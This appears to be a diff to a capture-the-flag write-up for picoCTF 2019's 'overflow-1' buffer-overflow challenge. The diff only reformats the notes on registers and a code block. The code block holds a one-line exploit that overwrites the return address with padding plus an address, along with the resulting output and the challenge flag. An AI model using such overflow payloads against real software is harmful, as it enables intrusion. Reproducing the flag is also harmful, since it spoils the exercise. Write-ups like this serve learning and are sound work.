@@ -26,9 +26,9 @@ so lets walk through the program
 
 ___Registers note___;
 
-__esp__ = the stack pointer; it points to where the stack begins (the 'top' of the stack)
+* __esp__ = the stack pointer; it points to where the stack begins (the 'top' of the stack)
 
-__ebp__ = the stack frame pointer;
+* __ebp__ = the stack frame pointer;
 
 The stack grows from esp -> ebp -> and past it 
 (we actually overwrite ebp aswell in this overflow)
@@ -65,9 +65,9 @@ print p.recvall()
 ```
 
 I had some trouble with the script but the output should be something like:
-`
+```
 Sain@pico-2019-shell1:/problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a$ python -c "print 'A' * 76 + '\xe6\x85\x04\x08'" | ./vuln
 Give me a string and lets see what happens:
 Woah, were jumping to 0x80485e6 !
 picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5bbbf8810}Segmentation fault (core dumped)
-`
+```
